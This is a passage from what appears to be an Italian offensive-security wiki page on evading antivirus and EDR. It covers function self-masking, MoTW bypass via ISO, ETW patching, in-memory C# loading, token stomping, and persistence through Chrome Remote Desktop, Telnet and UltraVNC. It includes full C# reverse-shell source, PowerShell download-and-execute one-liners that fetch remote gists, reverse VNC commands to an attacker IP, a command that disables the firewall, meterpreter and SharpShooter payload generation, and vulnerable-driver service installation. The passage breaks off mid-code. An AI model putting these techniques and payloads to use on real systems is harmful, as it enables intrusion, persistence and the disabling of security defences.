- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un PE Crypter .NET scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

### Self-masking per funzione assistito dal compilatore LLVM

Invece di mascherare un intero implant solo mentre è inattivo, un backend LLVM X86 modificato può mantenere le funzioni selezionate mascherate con XOR quando non sono attive. La PoC Function Peekaboo seleziona i nomi demangled che contengono `REG_`, inserisce stub di entrata/uscita indipendenti dalla posizione intorno al codice macchina finale e genera un unico handler di masking condiviso in `.text`; le firme a livello sorgente e la convenzione di chiamata Windows x64 restano invariate.<sup>[[38]](#references)[[39]](#references)</sup>

#### Trasformazione del flusso di controllo nel backend

Questa operazione va eseguita dopo la selezione e l'ottimizzazione delle istruzioni, perché la trasformazione deve includere **ogni istruzione di ritorno emessa** e conoscere il layout esatto di x86. Un `MachineFunctionPass` precedente all'emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina in modo che il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni eventuali operazioni di teardown dello stack/frame generate dal compilatore prima di ogni return; reindirizza solo l'istruzione di ritorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione consentono a un branch del prologo di puntare al suo epilogo successivo; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC di quattro byte `target - address_after_je`. Le chiamate e i salti all'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Un pass deve restituire `false` per una funzione non selezionata se non ha modificato nulla; la PoC restituisce erroneamente `true` in quel caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadati e inizializzazione pre-CRT

La PoC inserisce una chiave XOR e record da 16 byte contenenti un puntatore a funzione rilocato dal loader e una lunghezza a runtime in `.funcmeta`. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, leggendo la lunghezza e il relativo padding, e avanza di `0x10` byte tra i record. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca a runtime vede `.funcmet`. Un patcher esterno aggiunge uno `.stub` eseguibile, salva nello stub il vecchio RVA dell'entry point e reindirizza `AddressOfEntryPoint`; lo stub PIC ricava la base dell'immagine da `gs:[0x60]` → `[PEB+0x10]`, esamina gli import PE32+ per risolvere una `VirtualProtect` già importata e viene eseguito prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un valore sentinella in `gs:[0xE8]` e chiama ogni funzione nei metadati. Il prologo, sempre leggibile, registra l'inizio della funzione in `gs:[0xF0]`, rileva il valore sentinella e salta il corpo ancora non mascherato. L'epilogo usa quindi `call handler`; dopo che l'handler salva 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, quindi `end - start` può essere scritto nel relativo record dei metadati. Dopo aver mascherato tutti i corpi, lo stub cancella il valore sentinella e salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una chiamata normale, il prologo chiama lo stesso handler simmetrico per decodificare il corpo. Il percorso finale prosegue nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` invece di `call`, così, dopo aver rimaskerato il codice, il `ret` dell'handler consuma l'indirizzo di ritorno del chiamante originale e conserva il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di masking e indicatori per l'analisi

L'handler individua il record corrente, salta il prologo fisso visibile (in questa build, `0x46` byte), imposta il resto su `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte meno significativo della chiave e poi lo imposta su `PAGE_EXECUTE_READ`. Lo stesso ciclo decodifica all'ingresso e codifica a ogni uscita normale.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori più significativi di questa tecnica includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave e puntatori `.text` rilocati;
- l'analisi pre-CRT di PEB, tabella degli import e tabella delle sezioni, seguita da chiamate tramite ciascun puntatore nei metadati;
- prologhi PIC `call`/`pop` identici e numerosi punti di ritorno reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]`, seguite da ripetute transizioni `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Questa tecnica elude gli scanner di memoria, non offre protezione crittografica: il file patchato contiene ancora il corpo originale in chiaro, e un debugger può fermarsi su `VirtualProtect` o sul ciclo XOR e acquisire la funzione attiva. Anche lo XOR a un solo byte, i metadati leggibili e il limite fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB della PoC sono locali al thread, ma le pagine di codice modificate sono condivise a livello di processo. Le chiamate concorrenti o ricorsive possono quindi riattivare o disattivare le istruzioni mentre un'altra invocazione le sta eseguendo; anche le eccezioni e le uscite non locali possono impedire il re-masking. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze hard-coded per gli stub, verificare l'allineamento dello stack x64 nei percorsi `call` e `jmp` e chiamare `FlushInstructionCache` dopo aver riscritto byte eseguibili. Microsoft attribuisce esplicitamente al chiamante la responsabilità della coerenza della cache delle istruzioni quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Potresti aver visto questa schermata quando scarichi ed esegui da Internet alcuni eseguibili.

Microsoft Defender SmartScreen è un meccanismo di sicurezza pensato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen si basa principalmente sulla reputazione: le applicazioni scaricate raramente attivano SmartScreen, che avvisa l'utente finale e gli impedisce di eseguire il file (anche se è comunque possibile eseguirlo facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) chiamato Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dello Zone.Identifier ADS di un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **attendibile** **non attivano SmartScreen**.

Un modo molto efficace per impedire ai payload di ricevere il Mark of The Web è inserirli in un contenitore come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato ai volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che impacchetta i payload in contenitori di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ecco una demo per bypassare SmartScreen impacchettando payload all'interno di file ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging di Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività dannose.

Analogamente alla disattivazione (bypass) di AMSI, è possibile fare in modo che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Ciò si ottiene applicando una patch alla funzione in memoria affinché ritorni subito, disattivando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni su **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection degli assembly C#

Il caricamento in memoria di binari C# è una tecnica nota da parecchio tempo ed è ancora un ottimo metodo per eseguire i tuoi strumenti di post-exploitation senza farti intercettare dagli AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificale**, iniettare il codice dannoso di post-exploitation in quel nuovo processo, eseguirlo e, al termine, terminare il nuovo processo. Questo approccio presenta vantaggi e svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro implant Beacon. Ciò significa che, se qualcosa va storto durante l'attività di post-exploitation o il codice viene rilevato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva**. Lo svantaggio è che c'è una **probabilità maggiore** di essere rilevati dai **rilevamenti comportamentali**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice dannoso di post-exploitation **nel proprio processo**. In questo modo, puoi evitare di dover creare un nuovo processo e di farlo analizzare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, perché il processo potrebbe bloccarsi.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare assembly C# **da PowerShell**: dai un'occhiata a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e al [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Repackaging di strumenti .NET in WebAssembly con NativeAOT (WasmForge)

Le normali tecniche `execute-assembly` mantengono MSIL riconoscibile e inizializzano infine un CLR. **WasmForge** cambia invece la base di esecuzione: migra un progetto C# al target sperimentale NativeAOT-LLVM WASI, lo compila in anticipo in WebAssembly e incorpora quel modulo in un host PE per Windows basato su Wazero. Il processo risultante non richiede il CLR, il JIT o l'host `dotnet` del target, perciò le regole basate solo sui nomi degli assembly gestiti, sul caricamento del CLR, su AMSI o su .NET ETW perdono visibilità diretta. Questa è una tecnica di evasione/packaging, non un bypass dei confini di privilegio: il guest mantiene i permessi dello strumento originale e il suo comportamento OS osservabile.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilare un progetto C#

Il percorso di compilazione consigliato è l'ambiente Docker del progetto, perché include .NET 10 SDK, il workload NativeAOT-LLVM, WASI SDK 24.0, il linker e le dipendenze per la firma. Un `.csproj` viene rilevato automaticamente; la compilazione con un solo comando esegue la migrazione, l'applicazione delle patch di compatibilità, la compilazione WASM, la creazione del PE e la firma.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Per la risoluzione dei problemi o la revisione del codice generato, suddividi il processo in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` e un comando finale `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. L'immagine di build usa anche un wrapper `wasm-component-ld` per evitare la codifica dei componenti WASI Preview 2 e produrre il modulo semplice richiesto dal runtime incorporato.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging da C# wasm32 a Win32 x64

Non si tratta di una ricompilazione trasparente. NativeAOT-WASI non supporta o modifica funzionalità BCL orientate a Windows, e un guest wasm32 alloca normalmente slot per puntatori da quattro byte, mentre le API x64 possono restituire puntatori da otto byte. WasmForge affronta entrambi i problemi con i seguenti livelli generati:<sup>[[44]](#references)</sup>

1. Un source patcher corregge le differenze semantiche specifiche di AOT e reindirizza le chiamate non supportate a registry, pipes, WMI, identity, directory service, file version, LSA e funzionalità simili verso helper `Wf*`.
2. Uno scanner P/Invoke genera mapping `DirectPInvoke` per NativeAOT, in modo che le chiamate `[DllImport]` siano associate a simboli C bridge collegati, invece di caricare dinamicamente la DLL dichiarata all'interno del guest.
3. I puntatori destinati all'host usano `ulong` in C# e `uint64_t` in C. Un dispatcher generico inoltra la chiamata al gestore Win32 dell'host; un `out8_mask` contrassegna gli slot di output effettivamente da otto byte, di cui occorre conservare le metà superiori. Gli output non contrassegnati, strutturati come wasm32, usano una protezione snapshot/restore per evitare che una scrittura x64 corrompa i quattro byte adiacenti.
4. Bridge host dedicati gestiscono le operazioni che non si adattano al dispatch generico delle syscall, come l'accesso alla cache dei ticket LSA, le operazioni Kerberos/BCrypt con risultati strutturati, il traffico TCP KDC e le query LDAP.

Ad esempio, un wrapper per `version.dll!VerQueryValueW` passa quattro indirizzi host e imposta i bit 2 e 3 (`0xC`), perché il puntatore al valore e la lunghezza sono slot di output da otto byte. Il wrapper rimane generico e delega il nome della DLL, il nome dell'export, gli argomenti e la mask a `wf_call_v2`; l'host esegue la traduzione dei puntatori e invoca l'API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitazioni e indicatori di rilevamento

Il codice che fa ampio uso della reflection, il caricamento dinamico di assembly, le callback native arbitrarie e le strutture x64 complesse restituite nella memoria WASM possono comunque richiedere patch specifiche per ogni tool o fallire del tutto. Anche i socket generici di WASI Preview 2 possono raggiungere stub no-op, quindi i tool supportati usano shim host specifici per protocollo. Verifica ogni comando rispetto a una build nativa, invece di presumere la parità delle funzionalità.<sup>[[44]](#references)[[45]](#references)</sup>

Questa tecnica sposta la telemetria, anziché rendere invisibile il payload. Il rilevamento può concentrarsi su un PE che contiene o materializza un modulo WASM, sul comportamento di un runtime simile a Wazero, su allocazioni e copie insolite di memoria host/guest, sul dispatch generico diretto a Win32, su anomalie di firma e risorse PE, oltre che sulle chiamate API e sul traffico di rete risultanti. L’assenza di eventi CLR-load, AMSI o .NET ETW non dovrebbe quindi essere considerata una prova che un processo sia benigno.<sup>[[44]](#references)</sup>

## Utilizzo di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, dando alla macchina compromessa accesso **all’ambiente dell’interprete installato sulla condivisione SMB controllata dall’Attacker**.

Consentendo l’accesso ai binari dell’interprete e all’ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repository indica che Defender continua a scansionare gli script, ma usando Go, Java, PHP ecc. abbiamo **maggiore flessibilità per aggirare le firme statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno dato esito positivo.

## Re-hosting di WebAssembly per eludere l’analisi statica

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Il token stomping manipola il token di accesso di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire azioni privilegiate di ispezione o remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Utilizzo di software attendibile

### Chrome Remote Desktop

Come descritto in [**questo post sul blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile installare Chrome Remote Desktop sul PC di una vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scaricalo da https://remotedesktop.google.com/, fai clic su "Configura tramite SSH", quindi sul file MSI per Windows per scaricarlo.
2. Esegui il programma di installazione in modalità silenziosa sulla macchina della vittima (sono necessari i privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su Avanti. La procedura guidata ti chiederà di autorizzare l’operazione; fai clic sul pulsante Autorizza per continuare.
4. Esegui il comando fornito, apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare l’interfaccia grafica).
 

## Evasione avanzata

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

L’evasione è un argomento molto complesso: a volte bisogna tenere conto di molte fonti di telemetria diverse all’interno di un solo sistema, quindi è praticamente impossibile rimanere completamente inosservati in ambienti maturi.

Ogni ambiente in cui ti imbatterai avrà punti di forza e debolezze specifici.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94) per acquisire familiarità con tecniche di evasione più avanzate.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Anche questo è un ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull’evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuove parti del binario** finché **non individua quale parte Defender** rileva come malevola, quindi te la mostra.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), che offre il servizio tramite un’interfaccia web pubblica all’indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows 10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Configuralo per **avviarsi** all'avvio del sistema ed **eseguilo** ora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambia la porta telnet** (stealth) **e disabilita il firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (servono i download bin, non il setup)

**SULL’HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l’opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Poi sposta il binario _**winvnc.exe**_ e il file _**UltraVNC.ini**_ appena creato all’interno del **victim**

#### **Connessione inversa**

L’**attacker** deve **eseguire sul proprio** **host** il binario `vncviewer.exe -listen 5900`, così da essere **pronto** a ricevere una **connessione VNC** inversa. Poi, all’interno del **victim**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth, non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti verrà visualizzato un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare la guida, altrimenti verrà visualizzato un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

All'interno di GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** il **payload XML** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**L’attuale Defender terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilala con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Usalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# usando il compilatore

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di Python per creare injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility per console nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire ransomware. Lo strumento porta con sé un **driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate del kernel che neppure i servizi AV Protected-Process-Light (PPL) possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file distribuito su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys`, parte del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver ha una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è attivo.
2. **Installazione del servizio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo user land.
3. **IOCTL esposti dal driver**
   | Codice IOCTL | Funzionalità                            |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Termina un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
   | `0x990000D0` | Elimina un file arbitrario dal disco |
   | `0x990001D0` | Scarica il driver e rimuove il service |

   Proof-of-concept minimo in C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
